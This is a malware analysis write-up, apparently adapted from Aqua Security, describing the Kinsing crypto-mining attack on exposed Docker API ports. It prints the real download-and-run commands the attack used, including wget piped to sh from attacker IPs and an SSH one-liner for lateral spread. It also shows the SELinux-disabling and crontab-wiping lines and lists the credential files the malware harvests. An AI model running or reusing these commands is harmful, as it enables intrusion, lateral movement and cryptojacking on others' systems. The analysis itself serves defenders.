

# Kinsing Malware Attack  


Aqua Security Researchers discovered a malware crypto-mining campaign in April 2020  which abuses systems running misconfigured Docker services. 


In this attack, the attackers exploit a misconfigured Docker API port to run an Ubuntu  container with the ‘kinsing’ malicious malware (Golang-based Linux Agent), which in turn  runs a crypto-miner and then attempts to spread the malware to other containers and hosts.  Attack Initiation: Instantiating an Ubuntu container with unprotected open Docker API port. 


attack initialion :- Instantiating an ubuntu container with unprotected open Docker API port 

```

/bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null

```

the command does the following 
- Update packages with `apt-get update` 
- Install ‘wget’ with `apt-get`  
- Start the cron service  
- Download a shell script with the just installed `wget`  
-  Run the shell script and read indefinitely from `/dev/null` to keep the container alive and running. 


- Associated IP addresses for downloading `d.sh`:
1) 142.44.191.122
2) 217.12.221.244
3) 185.92.74.42


# Defense Evasion and Persistence

The shell script d.sh, referred to from hereon as `the shell script`, contains more than 600 lines. We discovered that the shell script does the following:

Disables security measures and clears logs:` echo SELINUX=disabled >/etc/selinux/config`
Kills numerous applications, notably other malwares and cryptominers.
Deletes files related to other malwares/cryptominers, most of them from the /tmp directory
Kills running rival malicious Docker containers and deletes their image.
Downloads the ‘kinsing’ malware and runs it
Uses crontab to download and run the shell script every minute
Looks for other commands running in cron, and if ones were identified, deletes all cron jobs, including its own. We are not certain why the attackers chose to do so, but that is what the script executes:
`crontab -l | sed '/update.sh/d' | crontab -`


A quick look at the malware’s strings reveals that it is a Golang-based Linux agent. It uses several Go libraries, including:

- go-resty – an HTTP and REST client library, used to communicate with a Command and Control (C&C) server.
- gopsutil – a process utility library, used for system and processes monitoring.
- osext – extension to the standard ‘os’ package, used to execute binaries.
- diskv - A disk-backed key-value store, for storage.
- Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.

# Communication with C&C servers

Before the malware proceeded to deploy its payload, it attempted to communicate with servers in Eastern Europe. It appears that there are dedicated servers for each function that the malware executes:

- Attempts to establish a connection with the following IP address: 45.10.88.102. The attempts fail as the server does not respond.
- Connects to 91.215.169.111, which appears to be the main C&C server. The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.
- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes.
- Connects to 193.33.87.219 to download the cryptominer C&C communication.

# Discovery and Lateral Movement
The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.

In order to discover potential targets and locate the information it needs to authenticate against, the script passively collects data from`/.ssh/config, .bash_history, /.ssh/known_hosts`, and the likes. We did not identify any active scanning techniques used to identify additional targets.

Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.

The actual shell script is named spr.sh this time around, but it is identical to the a d.sh shell script used earlier in the attack sequence

The following SSH command was used to spread it throughout the network:

```
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;"

```




We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.

At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi. The cryptominer was identified by Virus Total as a Bitcoin miner.

The cryptominer connects to a host with the 193.33.87.219 IP address using a log in request over HTTP, receives further instructions, and starts mining cryptocurrency.

The infographic below illustrates the full flow of the attack:

![](/img/KinsingMalwareInfography.png)


credit - https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability